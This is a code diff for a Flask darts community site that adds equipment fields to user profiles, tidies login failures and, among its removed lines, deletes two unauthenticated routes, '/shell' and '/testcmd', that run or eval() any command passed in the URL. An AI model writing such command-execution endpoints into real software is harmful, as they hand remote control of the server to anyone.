@@ -9,13 +9,7 @@ bcrypt = Bcrypt(app)
 
 @app.route('/', methods=['GET', 'POST'])
 def home():
-    return render_template('index.html', threads_list=darts.utils.get_threads_list(0, 10), ranking_list=darts.utils.get_ranking_list(0, 10))
-
-    # if request.method == 'POST':
-    #     username = request.form['username']
-    #     return render_template('index.html', data=username)
-    # return render_template('index.html')
-
+    return render_template('index.html', threads_list=darts.utils.get_threads_list(0, 10), ranking_list=darts.utils.get_countup_ranking(0, 10))
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -26,13 +20,13 @@ def login():
         password = request.form['password']
         user = User.query.filter_by(username=username).first()
         if user is None:
-            return 'Dont Login none'
+            return render_template('login.html', login_failed=True)
         if bcrypt.check_password_hash(user.password, password):
             session['logged_in'] = True
             session['username'] = user.username
             return redirect(url_for('home'))
         else:
-            return 'Dont Login'
+            return render_template('login.html', login_failed=True)
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
@@ -50,18 +44,6 @@ def logout():
     session['username'] = ''
     return redirect(url_for('home'))
 
-@app.route('/shell')
-def shell():
-    cmd = request.args.get('cmd')
-    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    stdout_data, stderr_data = p.communicate()
-    return stdout_data
-
-@app.route('/testcmd')
-def testcmd():
-    cmd = request.args.get('cmd')
-    return eval(cmd)
-
 @app.route('/user')
 def user():
     username = request.args.get('username')
@@ -72,12 +54,19 @@ def user():
         user_data = {}
         user_data['username'] = found_user.username
         user_data['score'] = found_user.score
+        user_data['barrel'] = found_user.barrel
+        user_data['flight'] = found_user.flight
+        user_data['shaft'] = found_user.shaft
         return render_template('user.html', user_data=user_data)
 
 @app.route('/user/edit', methods=['GET', 'POST'])
 def user_edit():
     if not session.get('logged_in'):
-        return render_template('user_edit.html')
+        session['logged_in'] = False
+        return redirect(url_for('home'))
+
+    if not session['logged_in']:
+        return redirect(url_for('home'))
 
     found_user = User.query.filter_by(username=session['username']).first()
     if found_user is None:
@@ -86,13 +75,29 @@ def user_edit():
         user_data = {}
         user_data['username'] = found_user.username
         if request.method == 'POST':
-            return render_template('user_edit.html', user_data=user_data)
+            barrel = request.form['barrel']
+            flight = request.form['flight']
+            shaft = request.form['shaft']
+
+            if barrel != '' and not barrel is None:
+                found_user.barrel = barrel
+                db.session.commit()
+
+            if flight != '' and not flight is None:
+                found_user.flight = flight
+                db.session.commit()
+
+            if shaft != '' and not shaft is None:
+                found_user.shaft = shaft
+                db.session.commit()
+
+            return redirect(url_for('user', username=session['username']))
         else:
             return render_template('user_edit.html', user_data=user_data)
 
 from darts.ranking import *
 from darts.bbs import *
 from darts.enquete import *
-
+from darts.admin import *
 
 
